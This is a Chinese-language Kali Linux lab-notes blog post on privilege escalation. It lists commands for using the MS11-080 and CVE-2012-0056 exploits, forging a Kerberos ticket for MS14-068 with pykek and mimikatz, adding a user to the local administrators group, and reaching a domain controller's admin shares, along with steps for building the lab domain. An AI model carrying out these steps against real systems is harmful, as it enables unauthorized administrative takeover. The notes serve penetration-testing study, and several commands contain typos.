Kali Linux笔记(三十一)：漏洞提权

发表于 2019-12-22 | 分类于 Kali

1. MS11-080

  • MS11-080（提权漏洞）
    • 🔺命令：searchploit MS11-080
    • 🔺命令：cp /usr/share/exploitdb/exploits/windows/local/18176.py（针对32位英文版操作系统）
    • 🔺命令：cp 18176.py C:/Python2.7
  • Kb2592799
    • https://technet.microsoft.com/library/security/ms11-080
查看升级的补丁：运行 → appwiz.cpl → show updates → remove
  • Pywin32
    • http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/
  • Pyinstaller（文件夹需要放到Python目录下,18176.c需要放到Pyinstaller文件夹中）
    • https://pypi.org/project/PyInstaller/2.1/#files
    • 🔺命令：..\python pyinstaller.py --onefile 18176.py
  • 🔺命令：18176.exe -O XP
  • 🔺命令：net localgroup administartor a /add（增加本地账号到管理员组）

2. MS11-046（拒绝服务）

  • Dos
公司若通过域环境管理电脑，统一分配软件和权限，一般安全性很高
在没有安装python环境的机子，可将脚本编译成exe文件（需要Pyinstaller、Pywin32）

3. MS14-068

  • MS14-068（远程漏洞利用）
Windows XP系统利用不成
Windows 7系统利用成功 lab\u1 penbox\w7
  • 库
    • https://github.com/mubix/pykek（ms14-068.py）
  • 🔺命令：searchexploit ms14-068
  • /usr/share/exploitdb/platforms/windows/remote/35474.py
  • 🔺命令：python 35474.py/ms14-068.py -u user@lab.com -s userSID -d dc.lab.com ▲2019.12.22 35473.py/ms14-068.py脚本报错（域控制名称，如果不在域中，只能输入域控制器的IP地址）
    • 会生成一个TGT文件票据（包含普通用户提升到管理员账号）
  • 输入u1的密码
  • 拷贝TGT_user1@lab.com.ccache到提权windows系统
  • 本地管理系统
    • 🔺命令：minikatz.exe log "kerberos::ptc TGT user@lab.com.ccache" exit
    • 访问管理共享：🔺命令：net use\\完整的域控制器名称\admin$
    • 访问域控制器C盘：运行 → \完整的域控制器名称\c$
    • 打开修改注册表：regedit → 连接网络注册表 → 域控制器IP地址 → 账号：user1@lab.com 密码
域管理：安全边界（有一台计算机作为管理机，可通过一台机器管理所有域内的机器）
服务器升级为域服务器的时候，会自动把Administartor升级为域服务器管理机
搭建域控制器Windows Server2003：
1.配置静态IP地址，DNS服务器指向自己
2.运行域程序的安装：dcpromo（安装过程需要光盘）
3.DNS全名：lab.com
4.分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）
5.加入域的计算机，在lab.com，Computer可以管理加入域的机器，需要Administrator登陆域接收器关闭防火墙
6.管理加入域的机器，删除域接受器本地的账号，在域接收器本地的Administrator组中加入一个新的u1域的账号，检查名称，u1具有域接收器本地管理员权限，不对其他域机器有管理员权限（可以不设置，为了后面实验）
搭建域接受器Windows XP：
1.准备 → 关闭防火墙 → 配置静态IP地址（DNS指向域控制器）
2.我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）
3.共享资源\\lab.com
5.获取SID： 通过whoami /all 查看域的SID
6.net view：查看域控制器完整名称

4. CVE-2012-0056

  • Ubuntu11.10
    • http://old-releases.ubuntu.com/releases/11.10
    • 🔺命令：searchexploit 18411.c（Kali上）
    • Linux之间拷贝文件: 🔺命令：SCP 文件 账号@IP地址：存放路径（通过SSH隧道，Kali端）
  • gcc（exploit-db/searchexploit都有存在EXP）
    • 🔺命令：mount /dev/cdrom /media/cdrom（挂载CD光盘设备）
    • 🔺命令：sudo apt-cdrom add && sudo apt-get install gcc（ubuntu停止安装更新源）
    • 🔺命令：sudo apt-get install openssh-server
    • 🔺命令：gcc 18411.c -o exp
  • CVE-2012-0056（操作系统内核对用户进程控制权限不严格）
    • /proc/pid/mem
    • kernels<=2.6.39
    • http://blog.zx2c4.com/749（漏洞详细原理）
/proc目录：内存中生成的临时/proc，保存了内存的实时数据，每生成一个进程，对应分配的PID，都会在这里创建一个目录
Ubuntu下：id查看当前用户信息
#：root用户提示符；$：普通用户提示符
